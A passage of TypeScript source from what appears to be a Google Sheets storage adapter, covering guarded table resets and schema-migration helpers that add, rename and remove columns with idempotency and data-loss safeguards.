    // Guarded like any other write: reset() clears the grid and rewrites the
    // header from the schema, so on a drifted sheet it would destroy the
    // human's column instead of reporting the drift (#179).
    this.assertHeaderAligned()
    this.invalidateDataCache()
    const sheet = this.getSheet()

    // Serialize before clearing. A cell-size rejection discovered after
    // clear() would have destroyed the existing rows in exchange for a failed
    // write — the guard has to run while the old data is still there (#136).
    const rows = data.map(row => this.objectToRow(row))

    // Clear all data except header
    sheet.clear()

    // Write header
    this.sheetsCall(() => sheet.getRange(1, 1, 1, this.columns.length).setValues([this.columns]))

    // Write data
    if (rows.length > 0) {
      this.sheetsCall(() =>
        sheet.getRange(2, 1, rows.length, this.columns.length).setValues(rows)
      )
    }
  }

  /**
   * Get raw sheet data (for debugging).
   *
   * Deliberately NOT header-guarded (#179): it bypasses the positional mapping
   * entirely, so it is the way to inspect a sheet the guard has just rejected.
   */
  getRawData(): unknown[][] {
    const sheet = this.getSheet()
    return this.sheetsCall(() => sheet.getDataRange().getValues())
  }

  /**
   * Physically add a column to the sheet: header row plus, when a default is
   * given, a one-shot backfill of the empty cells in that column (#127).
   *
   * This adapter is positional — `rowToObject`/`objectToRow` map cell index to
   * `this.columns[i]` — so a column has to exist in the physical layout before
   * any value can be stored in it. A migration that only wrote values through
   * `update()` left the sheet untouched while reporting success.
   *
   * Cost is independent of the row count: at most one header write plus one
   * ranged write over the new column. Idempotent — re-running it on an
   * already-added, already-backfilled column performs no write at all.
   *
   * @throws {UnknownColumnError} the column is not in the declared schema
   * @throws {SchemaMismatchError} the physical header contradicts the schema
   */
  addColumn(column: string, options?: AddColumnOptions): void {
    const targetIndex = this.columns.indexOf(column)
    if (targetIndex < 0) {
      throw new UnknownColumnError(column, this.sheetName, [...this.columns])
    }

    // Serialize the default up front, so an oversized one is rejected before
    // the sheet is restructured rather than after (#136).
    const defaultCell = options?.default === undefined
      ? undefined
      : this.serializeCell(column, options.default)

    const sheet = this.getSheet()
    const header = this.readHeader()
    const headerIndex = header.indexOf(column)

    if (headerIndex < 0) {
      // The sheet is behind the schema. Its header must be a prefix of the
      // declared columns minus the one being added; anything else means the
      // positional mapping is already broken and writing would corrupt data.
      const expected = this.columns.filter(col => col !== column)
      if (!isPrefix(header, expected)) {
        throw new SchemaMismatchError(this.sheetName, header, [...this.columns])
      }

      const position = targetIndex + 1
      if (position <= header.length) {
        // Mid-schema insert: shift the existing columns right so their values
        // stay under their own header instead of sliding one column left.
        // Not idempotent — a retry would shift the sheet twice.
        this.sheetsCallOnce(() => sheet.insertColumnBefore(position))
      }
      // Rewrite the whole header from the schema to guarantee alignment.
      this.sheetsCall(() => sheet.getRange(1, 1, 1, this.columns.length).setValues([this.columns]))
      this.invalidateDataCache()
    } else if (headerIndex !== targetIndex) {
      throw new SchemaMismatchError(this.sheetName, header, [...this.columns])
    }

    this.backfillColumn(targetIndex + 1, defaultCell)
  }

  /**
   * Physically rename a column: rewrite the single header cell (#180).
   *
   * The declared `columns` are the POST-rename schema, so `newName` must be
   * declared and `oldName` must not — that is the shape a deploy has once its
   * types are regenerated. The header cell at `newName`'s schema position must
   * currently read `oldName`; the values themselves never move, because this
   * adapter maps cells by position and the column is already in the right one.
   *
   * A value-level rename could not do this: the adapter already reads that cell
   * as `newName`, so the "old" field is never present, no row is ever written,
   * and the header keeps the old name while the schema declares the new one —
   * the exact live failure of #180.
   *
   * Idempotent: when the header already reads `newName` nothing is written, so
   * a re-run converges. Cost is one read plus at most one cell write,
   * independent of the row count.
   *
   * When the store declares BOTH names, the two columns are real and distinct
   * in this layout; the header must not change, so the operation degrades to
   * moving the values across (the name-keyed semantics), still as ranged
   * reads/writes rather than one `update()` per row.
   *
   * @throws {UnknownColumnError} `newName` is not in the declared schema
   * @throws {SchemaMismatchError} the header cell holds neither name
   */
  renameColumn(oldName: string, newName: string): void {
    const targetIndex = this.columns.indexOf(newName)
    if (targetIndex < 0) {
      throw new UnknownColumnError(newName, this.sheetName, [...this.columns])
    }
    const sourceIndex = this.columns.indexOf(oldName)

    // Locked so the header rewrite (or the value move, which is a read then a
    // write) cannot interleave with another execution's write, and flushed
    // before the lock is released (#128, #164). Re-entrant under migrate().
    this.withLock(() => {
      if (sourceIndex >= 0) {
        this.moveColumnValues(sourceIndex + 1, targetIndex + 1)
        return
      }

      const sheet = this.getSheet()
      const header = this.readHeader()
      const current = header[targetIndex]

      // Already renamed (or a sheet this adapter created with the new header):
      // converge instead of rewriting.
      if (current === newName) return
      if (current !== oldName) {
        throw new SchemaMismatchError(this.sheetName, header, [...this.columns])
      }

      this.sheetsCall(() =>
        sheet.getRange(1, targetIndex + 1, 1, 1).setValues([[newName]])
      )
      this.invalidateDataCache()
    })
  }

  /**
   * Physically delete a column from the sheet (#180).
   *
   * **Destructive by contract**: `deleteColumn` removes the header AND every
   * value in that column. Nothing can bring them back — a `down` migration can
   * re-create the column, never its data. Back the sheet up before running a
   * removal against production.
   *
   * The declared `columns` are the POST-removal schema, so the column must NOT
   * be declared. Leaving it physically in place is what corrupts the NEXT
   * deploy: the schema that no longer declares it maps every column to the
   * right of the ghost one position off, so reads return the neighbour's value
   * and writes land in the abandoned column (#180, live evidence).
   *
   * A column the schema still DOES declare is part of this store's positional
   * map, and dropping it here would misalign this very adapter. Its values are
   * cleared with one ranged write instead (the value-level meaning of the
   * operation) and the layout is kept; the physical delete happens under the
   * deploy whose schema no longer declares it.
   *
   * Idempotent: a column that is not on the sheet is a no-op, and a
   * cleared-values column is not cleared twice. Cost is one read plus one
   * structural call, independent of the row count.
   *
   * @throws {SchemaMismatchError} the header around the column contradicts the schema
   */
  removeColumn(column: string): void {
    const declaredIndex = this.columns.indexOf(column)

    this.withLock(() => {
      const sheet = this.getSheet()
      const header = this.readHeader()

      if (declaredIndex >= 0) {
        if (header[declaredIndex] !== column) {
          // Not on the sheet at all: nothing to clear. Anywhere else means the
          // positional mapping is already broken.
          if (header.indexOf(column) < 0) return
          throw new SchemaMismatchError(this.sheetName, header, [...this.columns])
        }
        this.clearColumnValues(declaredIndex + 1)
        return
      }

      const headerIndex = header.indexOf(column)
      if (headerIndex < 0) return

      // What is left after the delete must be the declared schema (or a prefix
      // of it, for a sheet that is behind on later columns). Anything else and
      // the shift would move live data under the wrong headers.
      const remaining = header.slice(0, headerIndex).concat(header.slice(headerIndex + 1))
      if (!isPrefix(remaining, this.columns)) {
        throw new SchemaMismatchError(this.sheetName, header, [...this.columns])
      }

      // deleteColumn shifts every later column left, so a repeat after a
      // spurious failure would destroy a second, innocent column.
      this.sheetsCallOnce(() => sheet.deleteColumn(headerIndex + 1))
      this.invalidateDataCache()
    })
  }

  /**
   * Move each cell of the column at `fromPosition` into the column at
   * `toPosition`, for rows whose source has a value and whose target is empty.
   *
   * Mirrors MigrationRunner's value-level rename guard (an emptiness test, not
   * an `in` test — #99/#112), but as two ranged writes instead of one
   * `update()` per row. Cells are copied verbatim, so escaping and typing
   * survive untouched. Writes nothing when no row qualifies, so a re-run
   * converges.
   */
  private moveColumnValues(fromPosition: number, toPosition: number): void {
    const sheet = this.getSheet()
    const lastRow = sheet.getLastRow()
    if (lastRow <= 1) return

    const rowCount = lastRow - 1
    const sourceRange = sheet.getRange(2, fromPosition, rowCount, 1)
    const targetRange = sheet.getRange(2, toPosition, rowCount, 1)
    const source = this.sheetsCall(() => sourceRange.getValues())
    const target = this.sheetsCall(() => targetRange.getValues())

    let moved = 0
    const nextSource: unknown[][] = []
    const nextTarget: unknown[][] = []
    for (let i = 0; i < rowCount; i++) {
      const from = source[i][0]
      const to = target[i][0]
      if (!isEmptyCellValue(from) && isEmptyCellValue(to)) {
        moved++
        nextSource.push([''])
        nextTarget.push([from])
      } else {
        nextSource.push([from])
        nextTarget.push([to])
      }
    }

    if (moved === 0) return

    // Target first: if the second write is lost, the value exists in both
    // columns and the next run converges. The other order would clear the
    // source before the copy landed and lose the data outright.
    this.sheetsCall(() => targetRange.setValues(nextTarget))
    this.sheetsCall(() => sourceRange.setValues(nextSource))
    this.invalidateDataCache()
  }

  /**
   * Blank every non-empty cell of a column with one ranged write, leaving the
   * column itself in place. Writes nothing when the column is already empty, so
   * a re-run converges.
   */
  private clearColumnValues(position: number): void {
    const sheet = this.getSheet()
    const lastRow = sheet.getLastRow()
    if (lastRow <= 1) return

    const range = sheet.getRange(2, position, lastRow - 1, 1)
    const current = this.sheetsCall(() => range.getValues())

    let filled = 0
    for (const [value] of current) {
      if (!isEmptyCellValue(value)) filled++
    }
    if (filled === 0) return

    this.sheetsCall(() => range.setValues(current.map(() => [''])))
    this.invalidateDataCache()
  }

  /** Read the current header row, trailing empty cells trimmed. */
  private readHeader(): string[] {
    const sheet = this.getSheet()
    const lastColumn = sheet.getLastColumn()
    if (lastColumn < 1) return []

    const values = this.sheetsCall(() => sheet.getRange(1, 1, 1, lastColumn).getValues())[0]
    const header = values.map(value => (isEmptyCellValue(value) ? '' : String(value)))
    while (header.length > 0 && header[header.length - 1] === '') {
      header.pop()
    }
    return header
  }

  /**
   * Write the already-serialized `cell` into every empty cell of a column with
   * one ranged write. Without a default nothing is written, so a re-run
   * converges instead of rewriting all N rows every time.
   *
   * Takes the serialized cell rather than the raw default so that
   * {@link addColumn} can reject an oversized value before it restructures the
   * sheet (#136).
   */
  private backfillColumn(position: number, cell: unknown): void {
    if (cell === undefined) return

    const sheet = this.getSheet()
    const lastRow = sheet.getLastRow()
    if (lastRow <= 1) return

    const range = sheet.getRange(2, position, lastRow - 1, 1)
    const current = this.sheetsCall(() => range.getValues())

    let emptyCount = 0
    const filled = current.map(([value]) => {
      if (isEmptyCellValue(value)) {
        emptyCount++
        return [cell]
      }
      return [value]
    })

    if (emptyCount === 0) return

    this.sheetsCall(() => range.setValues(filled))
    this.invalidateDataCache()
  }
}

/** A sheet cell can hold no `undefined`: empty reads back as an empty string. */
function isEmptyCellValue(value: unknown): boolean {
  return value === undefined || value === null || value === ''
}

/** A1-notation letter for a 0-based column index: 0 -> A, 25 -> Z, 26 -> AA. */
function toColumnLetter(index: number): string {
  let remaining = index + 1
  let letter = ''
  while (remaining > 0) {
    const digit = (remaining - 1) % 26
    letter = String.fromCharCode(65 + digit) + letter
    remaining = Math.floor((remaining - 1) / 26)
  }
  return letter
}

/** Whether `candidate` is a leading slice of `full`. */
function isPrefix(candidate: readonly string[], full: readonly string[]): boolean {
  if (candidate.length > full.length) return false
  return candidate.every((value, index) => value === full[index])
}
